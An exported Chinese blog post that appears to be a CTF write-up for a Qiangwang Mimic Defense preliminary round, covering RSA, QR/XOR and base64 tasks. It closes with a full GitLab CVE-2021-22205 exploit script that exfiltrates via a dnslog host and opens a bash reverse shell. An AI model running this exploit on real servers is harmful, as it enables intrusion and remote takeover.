    <title>第六届强网拟态防御国际精英挑战赛初赛</title>
    <url>/2023/11/13/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/629b0fc893fc43df905a434be60d8555.png" alt="1"></p>
<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>base64解密</p>
<h3 id="一眼看出"><a href="#一眼看出" class="headerlink" title="一眼看出"></a>一眼看出</h3><p><strong>费马定理</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag
<span class="token keyword">import</span> gmpy2


flag<span class="token operator">=</span><span class="token string">b''</span>

r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>
q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>

n <span class="token operator">=</span> p<span class="token operator">*</span>q

<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>


c <span class="token operator">=</span> enc<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>

<span class="token comment"># ('n =', mpz(121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313L))</span>
<span class="token comment"># ('c =', mpz(42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267L))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据以下代码求出p、q</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime
r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a <span class="token operator">-</span> r<span class="token punctuation">)</span>
q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
<span class="token comment">#p=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>

<span class="token comment">#q=11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>

<span class="token comment">#n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>盲猜e&#x3D;65537<br>密文c已经给出</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最终脚本:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>

p <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span>
q <span class="token operator">=</span> <span class="token number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263465587</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token comment"># 密文</span>
c <span class="token operator">=</span> <span class="token number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 求明文</span>
M <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>  <span class="token comment"># 快速求幂取模运算</span>

<span class="token comment"># Convert the plaintext to a string</span>
M_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># Convert M to hexadecimal and remove the '0x' prefix</span>
M_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>M_str<span class="token punctuation">)</span>  <span class="token comment"># Convert the hexadecimal string to bytes</span>
M_str_final <span class="token operator">=</span> M_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decode bytes to UTF-8 string</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>M_str_final<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者使用rsa解密工具<br><img src="https://img-blog.csdnimg.cn/ad455aeee45246fbaf257543b70001ad.png" alt="2"></p>
<h3 id="国际象棋与二维码："><a href="#国际象棋与二维码：" class="headerlink" title="国际象棋与二维码："></a>国际象棋与二维码：</h3><p><img src="https://img-blog.csdnimg.cn/90005912edcb4bdcb16217985d73a064.png" alt="23"><br>用这个图片跟原图片 异或<br><img src="https://img-blog.csdnimg.cn/f606096be1794c0aac580ef70f990176.png" alt="5"><br>扫码就是flag</p>
<h3 id="新型车联网安全网络协议破解（阶段一）"><a href="#新型车联网安全网络协议破解（阶段一）" class="headerlink" title="新型车联网安全网络协议破解（阶段一）"></a>新型车联网安全网络协议破解（阶段一）</h3><p>连上VPN后访问页面发现是gitlab，版本13.9，找到<a href="https://github.com/Al1ex/CVE-2021-22205">CVE-2021-22205</a><br>使用脚本直接打，可是整了半天使用脚本一直打不通😶‍🌫️，与靶机连接不上，借一个改过的poc<br>借鉴于<a href="https://mp.weixin.qq.com/s/LyxgB7YFM0RcZSN5hmZF9Q">这里</a>⬅️</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> socks
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
   ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| 
 | |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ 
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
  \____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ 

                                  Author:Al1ex@Heptagram
                                Github:https://github.com/Al1ex                         
     """</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
        验证模式：python CVE-2021-22205.py -v true -t target_url 
        攻击模式：python CVE-2021-22205.py -a true -t target_url -c command 
        批量检测：python CVE-2021-22205.py -s true -f file 
        '''</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;curl `whoami`.82sm53.dnslog.cn&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>
        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>
            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>
            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>
        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>
        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 目标 &#123;&#125; 存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 目标 &#123;&#125; 不存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        req1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/users/sign_in"</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>req1<span class="token punctuation">.</span>text<span class="token punctuation">,</span> features<span class="token operator">=</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
        token <span class="token operator">=</span> soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;"</span><span class="token operator">+</span>  command <span class="token operator">+</span><span class="token string">"&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span>
        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span><span class="token punctuation">,</span>
            <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span><span class="token punctuation">,</span>
            <span class="token string">"X-CSRF-Token"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">&#125;</span>
        flag <span class="token operator">=</span> <span class="token string">'Failed to process image'</span>
        req2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/uploads/user"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> flag <span class="token keyword">in</span> req2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 目标 &#123;&#125; 存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 请到dnslog或主机检查执行结果"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 目标 &#123;&#125; 不存在漏洞"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> url_link <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>
                url_path <span class="token operator">=</span> format_url<span class="token punctuation">(</span>url_link<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                check<span class="token punctuation">(</span>url_path<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">format_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"http"</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> <span class="token string">"https://"</span> <span class="token operator">+</span> url
            url <span class="token operator">=</span> url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> url
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'URL 错误 &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    attack<span class="token punctuation">(</span><span class="token string">"http://172.18.0.4/"</span><span class="token punctuation">,</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/8.1xx.1xx.xx/6666 0>&amp;1'"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Geekgame2023</title>
    <url>/2023/10/27/Geekgame2023/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="961c5797e0147bd196a092cd6efefa5fdf6a5241428179f60fa9d023191a9df2">87c33ccf373964f94b22f879069d2b548b7e141e2dd33c53ef59face8f1c9298241552d03707970365421182d469bd9a62a96ec95b5014348bf22d6b6b331b06f48fd21578862dd7895845128e258f1e80d42aa6b2e0477e7fd334bd7fdf60e73cca987f734395a14c06474af9bf95c31855ef21b14f0c5780cbb6c5cef0feab0a4248b4df0c9bcbed3eac50f15bbfdabce42f3f6aa923bb57cfd1ade362bd37d94e5bb8e8d4be94ee190db88c3553d7ad7023a4cfb9eb7129c55910e7d4318ff4c7ba013655cb80f2a45cabc9f91f2aa0d0fb29884261de6ce61d095b1d9d0554bbb4f19d3e3ec3b1df0dbfeabeae82688e81ba5f266c72c180df5c1f1ea1e915e7475c8af143c94c0b8bbaf4ac06ef0dd28371685c3a9fe39bd345ab755dab86e6f6df2797bc9daa55b4d2acf5ee4adcb4a79e66409bc47f152e839037210254c1b0b025e30814add5831fb126dcf5e6b6eeaf3e361fae1f039e210df7bbf6aa019313b4c8a0566d7f3b35c8dedaccb239bfb31ef41d62bd5ee85192f9fb0130767c94cd67919e4a10ab5aa7085f449e5f8f6056350f23e6f112f2a4f0470af119c66fa8cf11f8eb9d74b4713efefa9645c5a176a086975c92112e9d4b8645dc6103d46d03bd8a5b12ecfed1c59ee36446a36f3bb21588ac2028b2cdacaf4b4603c58431aebe4e79b9c4ef6912fccb9e4db18e4bd323616da7286ca5c24f9f3c5647c3dc1710cf98a5a73519e605aaa252eb1f2b8d226480cae3fb62ee6aa1d0224ca1931d5cbabdfc285a6165fa0cc907012c12c7e5a02e8fe157eca572744582bcce0a88db3b3e007564d46de264aeb42671c09b6cd5ed2789d60f7d6e6fad848e4f9d69a03e5fdb78fc304f9067a55fa66b5d315bfdc2a2db93c236f218e7538abad7bfc97e3aadb68e83462ae28ea4ccf45d93f630bcfb1afa110d56457106e4da7f38923282bd1de64cd881a5fd629e60e8546a148743f055a7f6eb53658279f7884ccaec66039a799d40b4bc1471c19e58cf7543d174f391170edb13a7ba94e796db0663da32ea7d38b74769573c6ef19f7b8980809c3df316a03c9c1b4045c08424b50b05aa3dc275134ce161b7d45a88d5d7278b1779a4d3abd880a66c3e1baa7c04d1aa34f0539e01ec8e7474794f7eed3a7c859a21472f5484271a8e0c80b92ea3685a0147965cd6a55fc1a67e4d2216452290b1d97269fbc74ca2897beac499f42f0b901ae08fe42ce2b05cb9b8608aae533dd620873dd6031e654df8aa990cb1a55c98fbe0421dc6a913f59dc2bc7f3c327e7301653b911b9c53c9815de8e8d96a666a70da5e1faa9c64e2314013f2ffe23acbc54aa8566da413175007430da93ba21ad58a153acbf6bbaaa83ce755ab012d616d1f412f43207b3879671c8d0eab8367ba8100605c83a0ee9696d20a06a34650cb8d26715d640f1610b5d300059b50838a26a228feba9e8966e67dc4c85870742fb14f79ebf0d2a1e37764f16753b3465ec81284c587c7f25ae689ab84b366c3a1aff0a5aa26f50bdf80a52bd1be55616bac56565950fd5893b812162e79c8b967459e2ddb3f165f76331385386862ed8b4d5d32f7738ff98afa9e42f071f3cb251ce910f4ad15fd04c344afc0556c11f999ff94bcfaa195375d08058437c1aa5a063592eb528de0fd68bffe902581a99445783eae3412ad9b681422d5606061c0f3399f31db36153c1787fc34b60e782182858fe25fb3b256a67aaea7c5423ed51d72092926441342a76f1219933444bd68f96732a9403d8890313fdb1204491bf92de5d6bc0c7fe334f2546b9d54825d27e750d775891ad36eed7282272d7a7febca42e9b10cc10d2b320d39994d6683a769b7b58c07a01c7226ae1e4f24e4bb8ddbb49cc2e508e07840747761bed8fc8bef886559b347dce5c4676b1b161951c991fb199f777dd9b0bad5e3a4ffc45db3abac6c84884a36bb5c36996d470e555bd214cbae332682309cbf33177d4ef66108825db86239544e5bea116b1dd252e60315d51990118bd18a8c15862b042c30ee48aadf22cb3d06f362ce16c4e876511d691de757f45d49d2e24c4bccad0120ce2ef7023cc9eb9161c5edf2828e1ef6589c011b42a7039fea31d8e1f29dd16123f9697eab6b5cc896fbe64fb60d9aa5bbae2cf9fe54f1b44f9b0241cf9f7ec382bfdf655608fe2143c0750d289db346427dfee737981efc6fa92de2c18ae56374a4b8b13b02e172fee8a9abc06e1a051fe18a8f818e3fcaa7c21322fec4243592f5cb2307b6046aa46684c15fe835edf90bee3f24960bd7e07125ecba4a465b07f9f35a8248f52285e7e8194c2b8a832753e524dd5ee9b759e8777565c74168619cc0d2eb4515be948ea2c8dd823fd2a645cd5850ba2572272f65aec408387fb8a9660d4abcc58305b0d8726a54a869b3ddea63ba4f37b8c091309587b20bc834e47af2f66885eecc91c5718f1a462c26a06175367f8b13006f257d4ea08d5ee5adfe60effa6c70227d4d300979d759ba7c272cd23d67832e430b7bcad39e5a67b147439160a69793df7b99139958d7a1a9ba0f7fe5fc41ee05fa54b7d2e857cc6fa12519565b0383fa1c628a2045b63396772e2a4c1437a67560fae2e7433dde841e113c9b34307f347ae1495454f6f42bbd217c9fe7c45c6c0ceab060dee575606e841f222c5c0b5de06fed06044e1a3a5515105